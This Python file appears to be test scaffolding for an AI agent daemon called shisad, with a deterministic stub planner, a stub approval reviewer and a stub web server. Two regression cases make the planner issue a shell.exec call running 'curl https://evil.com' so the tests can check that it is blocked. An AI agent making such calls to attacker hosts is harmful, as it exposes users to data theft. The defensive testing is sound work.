"""Deterministic planner, backend, and isolated daemon helpers for behavioral journeys."""

from __future__ import annotations

import asyncio
import json
import os
import re
import shlex
import shutil
import sqlite3
import subprocess
import sys
import threading
from collections.abc import AsyncIterator, Callable
from contextlib import asynccontextmanager, suppress
from dataclasses import dataclass
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs, urlparse

import pytest

from shisad.core.api.transport import ControlClient
from shisad.core.config import DaemonConfig
from shisad.core.providers.base import Message, ProviderResponse
from shisad.core.providers.local_planner import LocalPlannerProvider
from shisad.executors.sandbox import SandboxConfig, SandboxOrchestrator, SandboxResult
from shisad.executors.sandbox.models import ContainmentProfile
from shisad.memory.summarizer import _SUMMARY_SYSTEM_PROMPT
from shisad.security.intent_matching import (
    OPTIONAL_POLITE_REQUEST_PREFIX_FRAGMENT,
    has_follow_on_command,
    strip_optional_greeting_prefix,
)
from tests.helpers.behavioral import extract_tool_outputs
from tests.helpers.daemon import daemon_harness


def _install_approval_response(
    monkeypatch: pytest.MonkeyPatch,
    *,
    request: str,
    decision: str,
    target: str,
    scope: str = "one",
) -> None:
    """Provide a fixed model judgment without bypassing reviewer validation."""
    from shisad.core.approval_intent import ApprovalIntentReviewer
    from shisad.daemon.handlers import _impl_session

    class Provider:
        async def complete(self, messages, tools=None):
            assert tools is None
            packet = json.loads(messages[1].content)
            assert packet["user_request"] == request
            return ProviderResponse(
                message=Message(
                    role="assistant",
                    content=json.dumps(
                        {"decision": decision, "target": target, "scope": scope, "quote": request}
                    ),
                ),
                usage={},
            )

    def reviewer(**kwargs):
        return ApprovalIntentReviewer(provider=Provider(), firewall=kwargs["firewall"])

    monkeypatch.setattr(_impl_session, "ApprovalIntentReviewer", reviewer)


_USER_GOAL_RE = re.compile(
    (
        r"=== (?:USER GOAL|USER REQUEST) ===\n"
        r".*?\n"
        r"(.*?)\n\n"
        r"=== (?:EXTERNAL CONTENT[^\n]*|DATA EVIDENCE[^\n]*|END CONTEXT|END PAYLOAD)"
    ),
    flags=re.DOTALL,
)
# ADV-M3: derive the summarizer marker from production so it stays in sync if
# the summarizer system prompt is reworded.
_SUMMARIZER_SYSTEM_MARKER = _SUMMARY_SYSTEM_PROMPT.split(". ")[0] + "."


def _extract_user_goal(planner_input: str) -> str:
    normalized = planner_input.replace("^", "")
    match = _USER_GOAL_RE.search(normalized)
    if match:
        return match.group(1).strip()
    return normalized.strip()


def _extract_memory_context(planner_input: str) -> str:
    normalized = planner_input.replace("^", "")
    # v0.7.1 C2: same-scope recall lands under a separate header (derived
    # trust), and legacy/cross-scope/tainted recall keeps the untrusted
    # framing. Pick whichever header is present earliest so the stub
    # planner can recover "remembered" content from either.
    markers = (
        "MEMORY CONTEXT (same-scope recall; derived from this "
        "operator's own prior session memory):",
        "MEMORY CONTEXT (retrieved; treat as untrusted data):",
    )
    earliest_idx = -1
    for marker in markers:
        idx = normalized.find(marker)
        if idx >= 0 and (earliest_idx < 0 or idx < earliest_idx):
            earliest_idx = idx
    if earliest_idx < 0:
        return ""
    tail = normalized[earliest_idx:]
    stop = tail.find("CONVERSATION CONTEXT")
    if stop >= 0:
        tail = tail[:stop]
    return tail


def _extract_trusted_context_before_request(planner_input: str) -> str:
    normalized = planner_input.replace("^", "")
    return normalized.split("=== USER REQUEST ===", 1)[0]


def _extract_time_now_utc_from_planner_input(planner_input: str) -> str:
    normalized = planner_input.replace("^", "")
    match = re.search(r'"utc_datetime":\s*"(?P<utc>[^"]+)"', normalized)
    return match.group("utc") if match is not None else "the trusted runtime clock"


def _extract_data_evidence_context(planner_input: str) -> str:
    normalized = planner_input.replace("^", "")
    marker = "=== DATA EVIDENCE (UNTRUSTED) ==="
    idx = normalized.find(marker)
    if idx < 0:
        return ""
    tail = normalized[idx:]
    stop = tail.find("=== END PAYLOAD ===")
    if stop >= 0:
        tail = tail[:stop]
    return tail


def _extract_thread_resume_context(planner_input: str) -> str:
    normalized = planner_input.replace("^", "")
    marker = "THREAD RESUME"
    idx = normalized.find(marker)
    if idx < 0:
        return ""
    tail = normalized[idx:]
    stop = tail.find("CONVERSATION CONTEXT")
    if stop >= 0:
        tail = tail[:stop]
    return tail


def _latest_user_request_planner_input(records: list[str]) -> str:
    for candidate in reversed(records):
        if "=== USER REQUEST ===" in candidate or "=== USER GOAL ===" in candidate:
            return candidate
    raise AssertionError("expected at least one planner input containing a user request")


def _tool_call(tool_name: str, arguments: dict[str, Any], *, call_id: str) -> dict[str, Any]:
    return {
        "id": call_id,
        "type": "function",
        "function": {
            "name": tool_name,
            "arguments": json.dumps(arguments, sort_keys=True),
        },
    }


def _slugify_note_key(content: str) -> str:
    words = [token for token in re.findall(r"[a-z0-9]+", content.lower()) if token]
    return "note:" + "-".join(words[:6]) if words else "note:untitled"


def _extract_after_colon(goal: str) -> str:
    _head, sep, tail = goal.partition(":")
    return tail.strip() if sep else goal.strip()


def _extract_note_search_query(goal: str) -> str:
    match = re.search(r"search my notes(?: for)? (?P<query>.+)$", goal, flags=re.IGNORECASE)
    if match:
        return match.group("query").strip()
    return goal.strip()


def _extract_remembered_content(goal: str) -> str | None:
    match = re.match(r"remember(?: that)?\s+(.+)$", goal.strip(), flags=re.IGNORECASE)
    return match.group(1).strip() if match else None


def _extract_todo_complete_selector(goal: str) -> str:
    match = re.search(r"mark (?:the )?(?P<selector>.+?) todo complete$", goal, flags=re.IGNORECASE)
    if match:
        return match.group("selector").strip()
    match = re.search(r"complete todo (?P<selector>.+)$", goal, flags=re.IGNORECASE)
    if match:
        return match.group("selector").strip()
    return goal.strip()


def _normalize_stub_reminder_when(prefix: str, when: str) -> str:
    normalized = re.sub(r"\s+", " ", when).strip().strip("\"'")
    if not normalized:
        return ""
    if normalized.lower().startswith(("in ", "at ")):
        return normalized
    if prefix.lower() == "at":
        return f"at {normalized}"
    relative = re.fullmatch(
        r"(?P<value>\d+)\s+(?P<unit>seconds?|minutes?|hours?)(?:\s+from\s+now)?",
        normalized,
        flags=re.IGNORECASE,
    )
    if relative is not None:
        return f"in {relative.group('value')} {relative.group('unit')}"
    return f"at {normalized}"


def _extract_reminder_arguments(goal: str) -> tuple[str, str] | None:
    normalized_goal = strip_optional_greeting_prefix(goal)
    if has_follow_on_command(normalized_goal):
        return None
    match = re.match(
        rf"{OPTIONAL_POLITE_REQUEST_PREFIX_FRAGMENT}"
        r"(?:set|create|add)\s+(?:a\s+)?reminder\s+"
        r"(?P<prefix>for|at)\s+(?P<when>.+?)\s+"
        r"(?:(?:to\s+)?say|saying|with\s+(?:message|text))\s+(?P<message>.+)$",
        normalized_goal,
        flags=re.IGNORECASE,
    )
    if match:
        return (
            match.group("message").strip().strip("\"'"),
            _normalize_stub_reminder_when(match.group("prefix"), match.group("when")),
        )
    match = re.search(
        r"remind me to (?P<message>.+?) (?P<when>in \d+ (?:seconds?|minutes?|hours?))$",
        goal,
        flags=re.IGNORECASE,
    )
    if match:
        return match.group("message").strip(), match.group("when").strip()
    match = re.search(
        r"remind me(?: to)? (?P<message>.+?) at (?P<when>.+)$",
        goal,
        flags=re.IGNORECASE,
    )
    if match:
        return match.group("message").strip(), f"at {match.group('when').strip()}"
    return None


def _extract_browser_url(goal: str) -> str:
    match = re.search(r"(https?://\S+)", goal, flags=re.IGNORECASE)
    return match.group(1).strip() if match else ""


async def _stub_complete_unmarked(
    self: LocalPlannerProvider,
    messages: list[Message],
    tools: list[dict[str, Any]] | None = None,
) -> ProviderResponse:
    _ = tools
    if (
        messages
        and messages[0].role == "system"
        and _SUMMARIZER_SYSTEM_MARKER in messages[0].content
    ):
        return ProviderResponse(
            message=Message(role="assistant", content='{"entries": []}'),
            model="behavioral-stub",
            finish_reason="stop",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    planner_input = messages[-1].content if messages else ""
    goal = _extract_user_goal(planner_input)
    goal_lower = goal.lower()
    normalized_goal = " ".join(goal_lower.strip().split())
    normalized_input = planner_input.replace("^", "").lower()

    if (
        "post-tool synthesis pass" in normalized_input
        and '"tool_name": "time.now"' in normalized_input
    ):
        utc_datetime = _extract_time_now_utc_from_planner_input(planner_input)
        return ProviderResponse(
            message=Message(
                role="assistant",
                content=f"The current time is {utc_datetime} (UTC).",
            ),
            model="behavioral-stub",
            finish_reason="stop",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    if normalized_goal in {"what time is it?", "what is the current time?"}:
        trusted_context = _extract_trusted_context_before_request(planner_input)
        if "current_turn_started_at_utc=" not in trusted_context:
            return ProviderResponse(
                message=Message(role="assistant", content="missing-trusted-runtime-time"),
                model="behavioral-stub",
                finish_reason="stop",
                usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
            )
        return ProviderResponse(
            message=Message(
                role="assistant",
                content="",
                tool_calls=[_tool_call("time.now", {}, call_id="t-time-now")],
            ),
            model="behavioral-stub",
            finish_reason="tool_calls",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    if "pending actions (trusted control state)" in normalized_input:
        if normalized_goal in {"confirm", "approve", "yes", "go ahead", "confirm 1"}:
            return ProviderResponse(
                message=Message(
                    role="assistant",
                    content="Resolving the pending action.",
                    tool_calls=[
                        _tool_call(
                            "action.resolve",
                            {"decision": "confirm", "target": "1", "scope": "one"},
                            call_id="t-action-resolve-confirm",
                        )
                    ],
                ),
                model="behavioral-stub",
                finish_reason="tool_calls",
                usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
            )
        if normalized_goal in {"reject", "deny", "no", "reject 1"}:
            return ProviderResponse(
                message=Message(
                    role="assistant",
                    content="Resolving the pending action.",
                    tool_calls=[
                        _tool_call(
                            "action.resolve",
                            {"decision": "reject", "target": "1", "scope": "one"},
                            call_id="t-action-resolve-reject",
                        )
                    ],
                ),
                model="behavioral-stub",
                finish_reason="tool_calls",
                usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
            )
        if normalized_goal == "yes to all":
            return ProviderResponse(
                message=Message(
                    role="assistant",
                    content="Resolving all pending actions.",
                    tool_calls=[
                        _tool_call(
                            "action.resolve",
                            {"decision": "confirm", "target": "all", "scope": "all"},
                            call_id="t-action-resolve-confirm-all",
                        )
                    ],
                ),
                model="behavioral-stub",
                finish_reason="tool_calls",
                usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
            )
        if normalized_goal == "no to all":
            return ProviderResponse(
                message=Message(
                    role="assistant",
                    content="Resolving all pending actions.",
                    tool_calls=[
                        _tool_call(
                            "action.resolve",
                            {"decision": "reject", "target": "all", "scope": "all"},
                            call_id="t-action-resolve-reject-all",
                        )
                    ],
                ),
                model="behavioral-stub",
                finish_reason="tool_calls",
                usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
            )

    if "favorite color" in goal_lower and "what" in goal_lower:
        memory_context = _extract_memory_context(planner_input).lower()
        trusted_context = _extract_trusted_context_before_request(planner_input).lower()
        response = (
            "Your favorite color is blue."
            if (
                "favorite color is blue" in memory_context
                or (
                    "trusted same-session user context" in trusted_context
                    and "favorite color is blue" in trusted_context
                )
            )
            else "I don't know your favorite color yet."
        )
        return ProviderResponse(
            message=Message(role="assistant", content=response),
            model="behavioral-stub",
            finish_reason="stop",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    if "favorite editor" in goal_lower:
        trusted_context = _extract_trusted_context_before_request(planner_input).lower()
        response = (
            "Your favorite editor is helix."
            if "trusted identity memory" in trusted_context and "helix" in trusted_context
            else "I don't know your favorite editor yet."
        )
        return ProviderResponse(
            message=Message(role="assistant", content=response),
            model="behavioral-stub",
            finish_reason="stop",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    if "groceries" in goal_lower and "what" in goal_lower:
        memory_context = _extract_memory_context(planner_input).lower()
        response = (
            "You asked me to remember to buy groceries."
            if "groceries" in memory_context
            else "I don't know what you asked me to remember about groceries."
        )
        return ProviderResponse(
            message=Message(role="assistant", content=response),
            model="behavioral-stub",
            finish_reason="stop",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    if "my name is" in goal_lower:
        return ProviderResponse(
            message=Message(role="assistant", content="Nice to meet you!"),
            model="behavioral-stub",
            finish_reason="stop",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    if "what is my name" in goal_lower or "what's my name" in goal_lower:
        normalized_input = planner_input.replace("^", "").lower()
        response = (
            "Your name is Alice."
            if "my name is alice" in normalized_input
            else "I don't know your name."
        )
        return ProviderResponse(
            message=Message(role="assistant", content=response),
            model="behavioral-stub",
            finish_reason="stop",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    if "what was in that listing" in goal_lower or "what's the result" in goal_lower:
        normalized_input = planner_input.replace("^", "").lower()
        if "todo.log" in normalized_input or "install-2026.log" in normalized_input:
            return ProviderResponse(
                message=Message(role="assistant", content="The listing includes todo.log."),
                model="behavioral-stub",
                finish_reason="stop",
                usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
            )
        return ProviderResponse(
            message=Message(
                role="assistant",
                content="I need to list the directory to answer.",
                tool_calls=[_tool_call("fs.list", {}, call_id="t-followup-list")],
            ),
            model="behavioral-stub",
            finish_reason="tool_calls",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    if "gh29 specific navigation regression" in goal_lower:
        url = _extract_browser_url(goal)
        return ProviderResponse(
            message=Message(
                role="assistant",
                content="Opening the venue page from current search evidence.",
                tool_calls=[
                    _tool_call(
                        "web.search",
                        {"query": "GH29 Amour Tabelog navigation", "limit": 3},
                        call_id="t-gh29-search-specific",
                    ),
                    _tool_call(
                        "browser.navigate",
                        {"url": url},
                        call_id="t-gh29-navigate-generic",
                    ),
                ],
            ),
            model="behavioral-stub",
            finish_reason="tool_calls",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    if "gh29 homepage fallback regression" in goal_lower:
        url = _extract_browser_url(goal)
        return ProviderResponse(
            message=Message(
                role="assistant",
                content="Opening the homepage because no precise candidate exists.",
                tool_calls=[
                    _tool_call(
                        "web.search",
                        {"query": "GH29 homepage fallback no same-host candidate", "limit": 3},
                        call_id="t-gh29-search-fallback",
                    ),
                    _tool_call(
                        "browser.navigate",
                        {"url": url},
                        call_id="t-gh29-navigate-fallback",
                    ),
                ],
            ),
            model="behavioral-stub",
            finish_reason="tool_calls",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    if "browser navigate" in goal_lower or "open the browser to" in goal_lower:
        url = _extract_browser_url(goal)
        return ProviderResponse(
            message=Message(
                role="assistant",
                content="Opening the browser.",
                tool_calls=[
                    _tool_call(
                        "browser.navigate",
                        {"url": url},
                        call_id="t-browser-navigate",
                    )
                ],
            ),
            model="behavioral-stub",
            finish_reason="tool_calls",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    if "browser click" in goal_lower or "click the continue button" in goal_lower:
        return ProviderResponse(
            message=Message(
                role="assistant",
                content="Clicking the page control.",
                tool_calls=[
                    _tool_call(
                        "browser.click",
                        {"target": "#continue", "description": "continue link"},
                        call_id="t-browser-click",
                    )
                ],
            ),
            model="behavioral-stub",
            finish_reason="tool_calls",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    if "continue from the current browser session" in goal_lower:
        normalized_input = planner_input.replace("^", "").lower()
        if (
            "browser session state" in normalized_input
            and "/browser-events" in normalized_input
            and "/browser-event-detail" in normalized_input
        ):
            return ProviderResponse(
                message=Message(
                    role="assistant",
                    content="Continuing from the current browser page.",
                    tool_calls=[
                        _tool_call("browser.read_page", {}, call_id="t-browser-followup-read")
                    ],
                ),
                model="behavioral-stub",
                finish_reason="tool_calls",
                usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
            )
        return ProviderResponse(
            message=Message(role="assistant", content="missing-browser-grounding"),
            model="behavioral-stub",
            finish_reason="stop",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    if "browser read page" in goal_lower or "read the browser page" in goal_lower:
        return ProviderResponse(
            message=Message(
                role="assistant",
                content="Reading the browser page.",
                tool_calls=[_tool_call("browser.read_page", {}, call_id="t-browser-read-page")],
            ),
            model="behavioral-stub",
            finish_reason="tool_calls",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    if "browser screenshot" in goal_lower or "take a browser screenshot" in goal_lower:
        return ProviderResponse(
            message=Message(
                role="assistant",
                content="Capturing the browser page.",
                tool_calls=[_tool_call("browser.screenshot", {}, call_id="t-browser-screenshot")],
            ),
            model="behavioral-stub",
            finish_reason="tool_calls",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    if "browser end session" in goal_lower or "end the browser session" in goal_lower:
        return ProviderResponse(
            message=Message(
                role="assistant",
                content="Closing the browser session.",
                tool_calls=[_tool_call("browser.end_session", {}, call_id="t-browser-end")],
            ),
            model="behavioral-stub",
            finish_reason="tool_calls",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    attachment_match = re.search(
        r"ingest attachment (?P<path>.+)$",
        goal,
        flags=re.IGNORECASE,
    )
    if attachment_match is not None:
        return ProviderResponse(
            message=Message(
                role="assistant",
                content="Ingesting the attachment.",
                tool_calls=[
                    _tool_call(
                        "attachment.ingest",
                        {
                            "path": attachment_match.group("path").strip(),
                            "mime_type": "image/png",
                        },
                        call_id="t-attachment-ingest",
                    )
                ],
            ),
            model="behavioral-stub",
            finish_reason="tool_calls",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    if "browser type " in goal_lower and "name field" in goal_lower and "click send" in goal_lower:
        match = re.search(
            r"browser type (?P<text>.+?) into the name field and click send$",
            goal,
            flags=re.IGNORECASE,
        )
        text = match.group("text").strip() if match else "hello"
        return ProviderResponse(
            message=Message(
                role="assistant",
                content="Typing into the browser form and clicking send.",
                tool_calls=[
                    _tool_call(
                        "browser.type_text",
                        {
                            "target": "#name",
                            "text": text,
                            "is_sensitive": True,
                            "click_target": "#send",
                        },
                        call_id="t-browser-type-click",
                    )
                ],
            ),
            model="behavioral-stub",
            finish_reason="tool_calls",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    if "browser type " in goal_lower and "name field" in goal_lower:
        submit = "submit" in goal_lower
        match = re.search(
            r"browser type (?P<text>.+?) into the name field(?: and submit)?$",
            goal,
            flags=re.IGNORECASE,
        )
        text = match.group("text").strip() if match else "hello"
        return ProviderResponse(
            message=Message(
                role="assistant",
                content="Typing into the browser form.",
                tool_calls=[
                    _tool_call(
                        "browser.type_text",
                        {
                            "target": "#name",
                            "text": text,
                            "submit": submit,
                        },
                        call_id="t-browser-type",
                    )
                ],
            ),
            model="behavioral-stub",
            finish_reason="tool_calls",
            usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
        )

    tool_calls: list[dict[str, Any]] = []
    thread_call = None
    if normalized_goal == "list my threads":
        thread_call = _tool_call("thread.list", {}, call_id="t-thread")
    elif " thread " in normalized_goal:
        verb, _, tail = normalized_goal.partition(" thread ")
        thread_id = tail.split()[0]
        if verb in {"inspect", "resume", "close", "why"}:
            arguments = {"thread_id": thread_id}
            if verb == "why":
                arguments["query"] = goal.rsplit(" for ", 1)[-1]
            thread_call = _tool_call(f"thread.{verb}", arguments, call_id="t-thread")
    note_create_call = None
    remembered_content = _extract_remembered_content(goal)
    if "add a note" in goal_lower or goal_lower.startswith("note:") or remembered_content:
        content = remembered_content or _extract_after_colon(goal)
        note_create_call = _tool_call(
            "note.create",
            {"content": content, "key": _slugify_note_key(content)},
            call_id="t-note-create",
        )
    note_list_call = (
        _tool_call("note.list", {"limit": 10}, call_id="t-note-list")
        if "list my notes" in goal_lower
        else None
    )
    note_search_call = (
        _tool_call(
            "note.search",
            {"query": _extract_note_search_query(goal), "limit": 10},
            call_id="t-note-search",
        )
        if "search my notes" in goal_lower
        else None
    )
    todo_create_call = None
    if "add todo" in goal_lower or "add a todo" in goal_lower:
        title = _extract_after_colon(goal)
        todo_create_call = _tool_call(
            "todo.create",
            {"title": title},
            call_id="t-todo-create",
        )
    todo_list_call = (
        _tool_call("todo.list", {"limit": 10}, call_id="t-todo-list")
        if "list my todos" in goal_lower
        else None
    )
    todo_complete_call = (
        _tool_call(
            "todo.complete",
            {"selector": _extract_todo_complete_selector(goal)},
            call_id="t-todo-complete",
        )
        if ("todo complete" in goal_lower or goal_lower.startswith("complete todo"))
        else None
    )
    reminder_args = _extract_reminder_arguments(goal)
    reminder_create_call = (
        _tool_call(
            "reminder.create",
            {
                "message": reminder_args[0],
                "when": reminder_args[1],
            },
            call_id="t-reminder-create",
        )
        if reminder_args is not None
        else None
    )
    reminder_list_call = (
        _tool_call("reminder.list", {"limit": 10}, call_id="t-reminder-list")
        if ("list my reminders" in goal_lower or "what reminders" in goal_lower)
        else None
    )
    search_query = goal.split("search", 1)[-1].strip().removeprefix("for ")
    search_call = (
        _tool_call(
            "web.search",
            {"query": search_query, "limit": 3},
            call_id="t-search",
        )
        if ("search" in goal_lower or "latest news" in goal_lower)
        else None
    )
    read_path = next((x for x in goal.split() if Path(x).suffix), "README.md")
    read_call = (
        _tool_call("fs.read", {"path": read_path, "max_bytes": 4096}, call_id="t-readme")
        if ("read" in goal_lower and "readme" in goal_lower)
        else None
    )
    missing_install_read_call = (
        _tool_call(
            "fs.read",
            {
                "path": "TODO.LOG" if "todo.log" in goal_lower else "INSTALL.LOG",
                "max_bytes": 4096,
            },
            call_id="t-install-log",
        )
        if (
            ("install.log" in goal_lower or "todo.log" in goal_lower)
            and ("review" in goal_lower or "read" in goal_lower)
        )
        else None
    )
    similar_file_list_call = (
        _tool_call("fs.list", {}, call_id="t-similar-file-list")
        if (
            ("look for" in goal_lower or "similar" in goal_lower)
            and any(token in goal_lower for token in ("file", "filename"))
        )
        else None
    )
    list_call = (
        _tool_call("fs.list", {}, call_id="t-list")
        if (
            "list" in goal_lower
            and any(token in goal_lower for token in ("file", "files", "folder", "directory"))
        )
        else None
    )
    fetch_url_match = re.search(r"https?://\S+", goal) if "fetch" in goal_lower else None
    fetch_call = (
        _tool_call(
            "web.fetch",
            {"url": fetch_url_match.group(0), "max_bytes": 65536},
            call_id="t-fetch",
        )
        if fetch_url_match is not None
        else None
    )
    git_status_call = (
        _tool_call("git.status", {}, call_id="t-git-status") if "git status" in goal_lower else None
    )
    git_log_call = (
        _tool_call("git.log", {"limit": 5}, call_id="t-git-log")
        if "git log" in goal_lower
        else None
    )
    git_diff_call = (
        _tool_call("git.diff", {"max_lines": 100}, call_id="t-git-diff")
        if "git diff" in goal_lower
        else None
    )
    diagnostic_audit_command_match = re.search(
        r"\bshisa(?:d|ctl)\s+audit\s+query\b[^\n`]*",
        goal,
        flags=re.IGNORECASE,
    )
    diagnostic_audit_command_call = None
    if diagnostic_audit_command_match is not None:
        try:
            diagnostic_audit_command = shlex.split(diagnostic_audit_command_match.group(0))
        except ValueError:
            diagnostic_audit_command = []
        if diagnostic_audit_command:
            diagnostic_audit_command_call = _tool_call(
                "shell.exec",
                {"command": diagnostic_audit_command, "command_intent": "execute"},
                call_id="t-diagnostic-audit-query",
            )
    gh84_blocked_shell_call = (
        _tool_call(
            "shell.exec",
            {"command": ["curl", "https://evil.com"], "command_intent": "execute"},
            call_id="t-gh84-blocked-shell",
        )
        if "gh84 blocked shell denial regression" in goal_lower
        else None
    )
    gh84_mixed_blocked_shell_call = (
        _tool_call(
            "shell.exec",
            {"command": ["curl", "https://evil.com"], "command_intent": "execute"},
            call_id="t-gh84-mixed-blocked-shell",
        )
        if "gh84 mixed blocked shell denial regression" in goal_lower
        else None
    )
    fs_write_call = (
        _tool_call(
            "fs.write",
            {"path": "test-output.txt", "content": "hello from behavioral test"},
            call_id="t-fs-write",
        )
        if "write" in goal_lower and "file" in goal_lower
        else None
    )
    i5b_multi_confirmation_urls = (
        re.findall(r"https?://[^\s]+", goal)
        if "i5b multi confirmation delivery journey" in goal_lower
        else []
    )
    i5b_multi_confirmation_calls = [
        _tool_call(
            "web.fetch",
            {"url": url, "max_bytes": 65536},
            call_id=f"t-i5b-pending-{index}",
        )
        for index, url in enumerate(i5b_multi_confirmation_urls, start=1)
    ]
    unknown_probe_call = (
        _tool_call("unknown.tool", {"probe": True}, call_id="t-unknown")
        if "unknown tool probe" in goal_lower
        else None
    )
    if i5b_multi_confirmation_calls:
        tool_calls.extend(i5b_multi_confirmation_calls)
    elif gh84_mixed_blocked_shell_call is not None:
        tool_calls.extend(
            [
                _tool_call(
                    "fs.read",
                    {"path": "README.md", "max_bytes": 4096},
                    call_id="t-gh84-mixed-readme",
                ),
                gh84_mixed_blocked_shell_call,
            ]
        )
    elif gh84_blocked_shell_call is not None:
        tool_calls.append(gh84_blocked_shell_call)
    elif unknown_probe_call is not None:
        tool_calls.append(unknown_probe_call)
    elif thread_call is not None:
        tool_calls.append(thread_call)
    elif note_create_call is not None:
        tool_calls.append(note_create_call)
    elif note_search_call is not None:
        tool_calls.append(note_search_call)
    elif note_list_call is not None:
        tool_calls.append(note_list_call)
    elif todo_create_call is not None:
        tool_calls.append(todo_create_call)
    elif todo_complete_call is not None:
        tool_calls.append(todo_complete_call)
    elif todo_list_call is not None:
        tool_calls.append(todo_list_call)
    elif reminder_create_call is not None:
        tool_calls.append(reminder_create_call)
    elif reminder_list_call is not None:
        tool_calls.append(reminder_list_call)
    elif search_call is not None and read_call is not None:
        read_pos = goal_lower.find("read")
        search_pos = goal_lower.find("search")
        if 0 <= read_pos < (search_pos if search_pos >= 0 else 1_000_000):
            tool_calls.extend([read_call, search_call])
        else:
            tool_calls.extend([search_call, read_call])
    elif missing_install_read_call is not None:
        tool_calls.append(missing_install_read_call)
    elif read_call is not None:
        tool_calls.append(read_call)
    elif search_call is not None:
        tool_calls.append(search_call)
    elif similar_file_list_call is not None:
        tool_calls.append(similar_file_list_call)
    elif list_call is not None:
        tool_calls.append(list_call)
    elif fetch_call is not None:
        tool_calls.append(fetch_call)
    elif git_status_call is not None:
        tool_calls.append(git_status_call)
    elif git_log_call is not None:
        tool_calls.append(git_log_call)
    elif git_diff_call is not None:
        tool_calls.append(git_diff_call)
    elif diagnostic_audit_command_call is not None:
        tool_calls.append(diagnostic_audit_command_call)
    elif fs_write_call is not None:
        tool_calls.append(fs_write_call)

    if gh84_mixed_blocked_shell_call is not None or gh84_blocked_shell_call is not None:
        assistant_response = (
            "I can use shell.exec for that. Could you clarify what you want me to run?"
        )
    elif tool_calls:
        assistant_response = "Working on it."
    elif "hello" in goal_lower or goal_lower.strip() in {"hi", "hello"}:
        assistant_response = "Hello! How can I help?"
    else:
        assistant_response = "OK."
    return ProviderResponse(
        message=Message(role="assistant", content=assistant_response, tool_calls=tool_calls),
        model="behavioral-stub",
        finish_reason="stop",
        usage={"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
    )


async def _stub_complete(
    self: LocalPlannerProvider,
    messages: list[Message],
    tools: list[dict[str, Any]] | None = None,
) -> ProviderResponse:
    response = await _stub_complete_unmarked(self, messages, tools)
    return response.model_copy(update={"trusted_origin": "local-fallback"})


def _force_deterministic_local_planner(
    *,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # Model routing has an implicit remote-enable path when SHISA_API_KEY is present,
    # so explicitly disable remote per-route and clear common API keys.
    for var in (
        "SHISAD_MODEL_REMOTE_ENABLED",
        "SHISAD_MODEL_PLANNER_REMOTE_ENABLED",
        "SHISAD_MODEL_EMBEDDINGS_REMOTE_ENABLED",
        "SHISAD_MODEL_MONITOR_REMOTE_ENABLED",
    ):
        monkeypatch.setenv(var, "false")
    for key in (
        "SHISA_API_KEY",
        "SHISAD_MODEL_API_KEY",
        "OPENAI_API_KEY",
        "OPENROUTER_API_KEY",
        "GEMINI_API_KEY",
    ):
        monkeypatch.delenv(key, raising=False)
    monkeypatch.setattr(LocalPlannerProvider, "complete", _stub_complete, raising=True)


class _StubSearchHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        if parsed.path == "/browser":
            body = (
                b"<html><head><title>Browser Home</title></head><body>"
                b"<h1>Hello browser</h1>"
                b"<p>Read only content for behavioral test.</p>"
                b"<a id='continue' href='/browser-next'>Continue</a>"
                b"</body></html>"
            )
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if parsed.path == "/browser-next":
            body = (
                b"<html><head><title>Browser Next</title></head><body>"
                b"You reached the next browser page."
                b"</body></html>"
            )
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if parsed.path == "/browser-events":
            body = (
                b"<html><head><title>Browser Events</title></head><body>"
                b"<h1>English Commander Gathering</h1>"
                b"<p>Official detail path: /browser-event-detail</p>"
                b"<a id='event-detail' href='/browser-event-detail'>Event detail</a>"
                + b"</body></html>"
            )
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if parsed.path == "/browser-event-detail":
            body = (
                b"<html><head><title>Event Detail</title></head><body>"
                b"Registration is in person at the venue."
                b"</body></html>"
            )
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
